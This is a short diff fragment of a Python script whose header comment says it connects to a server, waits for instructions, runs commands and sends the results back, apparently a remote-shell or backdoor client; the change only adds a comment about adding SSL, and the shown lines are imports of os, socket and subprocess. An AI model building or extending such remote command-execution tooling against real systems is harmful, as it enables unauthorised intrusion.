@@ -1,5 +1,5 @@
 #connect to server, wait for instructions, execute commands, and send results back to server
-
+#add ssl for funs :)
 import os
 import socket
 import subprocess
